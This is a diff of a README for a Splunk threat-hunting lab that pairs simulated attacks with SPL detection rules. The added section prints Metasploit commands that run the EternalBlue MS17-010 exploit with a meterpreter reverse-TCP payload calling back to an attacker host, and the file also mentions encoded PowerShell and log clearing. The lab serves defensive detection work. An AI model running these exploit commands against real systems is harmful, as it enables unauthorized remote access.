@@ -1,4 +1,3 @@
-
 # Advanced Threat Hunting & Detection Engineering with Splunk
 
 ## 📌 Executive Summary
@@ -9,24 +8,24 @@ This project demonstrates advanced threat hunting and detection engineering in S
 
 ## 🎯 Why This Project Matters
 
-Modern SOCs struggle not with lack of alerts, but with **low-quality signals and alert fatigue**.  
+Modern SOCs struggle not with lack of alerts, but with **low-quality signals and alert fatigue**.
 This project focuses on:
 
-- **Separating malicious behavior from noise**
-- **Understanding attacker intent, not just events**
-- **Correlating weak signals into strong detections**
-- **Reducing false positives while preserving visibility**
+* **Separating malicious behavior from noise**
+* **Understanding attacker intent, not just events**
+* **Correlating weak signals into strong detections**
+* **Reducing false positives while preserving visibility**
 
 ---
 
 ## 🧰 Technology Stack
 
-- **SIEM:** Splunk Enterprise Security  
-- **Endpoint Telemetry:** Windows Event Logs + Sysmon  
-- **Attacker Platform:** Kali Linux  
-- **Attack Tooling:** Nmap, Hydra, Impacket, PowerShell, Metasploit  
-- **Framework:** MITRE ATT&CK  
-- **Query Language:** SPL  
+* **SIEM:** Splunk Enterprise Security
+* **Endpoint Telemetry:** Windows Event Logs + Sysmon
+* **Attacker Platform:** Kali Linux
+* **Attack Tooling:** Hydra, Impacket, PowerShell, Metasploit
+* **Framework:** MITRE ATT&CK
+* **Query Language:** SPL
 
 ---
 
@@ -44,7 +43,7 @@ Kali Linux (Attacker)
  Splunk Enterprise Security
         ↓
  Detection Rules, Correlation & Dashboards
-````
+```
 
 📸 Screenshot: `screenshots/architecture_overview.png`
 
@@ -54,45 +53,49 @@ Kali Linux (Attacker)
 
 ---
 
-## 1️⃣ Network Reconnaissance (Nmap)
+## 1️⃣ Initial Access – SMB Exploitation (EternalBlue via Metasploit)
 
 ### 🔹 What Is Being Simulated
 
-A **full TCP SYN scan with service enumeration**, mimicking how attackers identify:
+Remote code execution using the **EternalBlue (MS17-010) SMB vulnerability**, simulating how attackers gain **unauthenticated initial access** to a Windows host.
 
-* Live hosts
-* Open ports
-* Exposed services
+This reflects real-world wormable exploits used by ransomware and nation-state actors.
 
-**Kali Command:**
+**Metasploit Commands:**
 
 ```bash
-nmap -sS -sV -p- 192.168.1.10
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.20
+exploit
 ```
 
 ### 🔹 Why Attackers Do This
 
-Reconnaissance is the **foundation of every attack**.
-Attackers rarely exploit blindly — they first **map the attack surface** to identify exploitable services such as RDP, SMB, or outdated web servers.
+* Exploits allow **authentication bypass** and instant code execution
+* EternalBlue enabled large-scale outbreaks (WannaCry, NotPetya)
+* SMB vulnerabilities remain highly impactful in flat networks
 
 ### 🔹 Detection Logic
 
 ```spl
-index=windows EventCode=3
-| stats count by src_ip, dest_ip
-| where count > 100
+index=windows (EventCode=1 OR EventCode=3 OR EventCode=7045)
+| stats count by src_ip, dest_ip, process_name
+| where count > 5
 ```
 
 ### 🔹 Why This Detection Is Important
 
-* Legitimate users do not scan all ports on a host
-* High connection volume from a single source is a strong early indicator
-* Detecting recon early allows defenders to **disrupt the kill chain before exploitation**
+* Correlates weak signals into a strong exploitation narrative
+* Detects suspicious SMB-driven execution patterns
+* Identifies early-stage compromise before persistence
 
 📸 Screenshots:
 
-* `screenshots/nmap_raw_events.png`
-* `screenshots/nmap_detection.png`
+* `screenshots/eternalblue_attempt.png`
+* `screenshots/eternalblue_alert.png`
 
 ---
 
@@ -135,7 +138,7 @@ index=windows EventCode=4625
 
 ---
 
-## 3️⃣ Lateral Movement – PsExec
+## 2️⃣ Lateral Movement – PsExec
 
 ### 🔹 What Is Being Simulated
 
@@ -173,7 +176,7 @@ index=windows EventCode=7045
 
 ---
 
-## 4️⃣ PowerShell Abuse (Encoded Command)
+## 3️⃣ PowerShell Abuse (Encoded Command)
 
 ### 🔹 What Is Being Simulated
 
@@ -183,7 +186,6 @@ Execution of **Base64-encoded PowerShell**, commonly used to evade detection.
 
 ```powershell
 powershell -EncodedCommand bgBvAHQAZQBwAGEAZAA=
-
 ```
 
 ### 🔹 Why Attackers Do This
@@ -211,7 +213,7 @@ index=windows EventCode=4104
 
 ---
 
-## 5️⃣ Defense Evasion – Log Clearing
+## 4️⃣ Defense Evasion – Log Clearing
 
 ### 🔹 What Is Being Simulated
 
@@ -247,7 +249,7 @@ index=windows EventCode=1102
 
 ---
 
-## 6️⃣ Metasploit RDP Exploitation (BlueKeep-style Simulation)
+## 5️⃣ Metasploit RDP Exploitation (BlueKeep-style Simulation)
 
 ### 🔹 What Is Being Simulated
 
@@ -316,6 +318,3 @@ index=notable
 * Faster triage and investigation
 * Detections validated with real attacker behavior
 * Strong defensive and analytical depth demonstrated
-
----
-
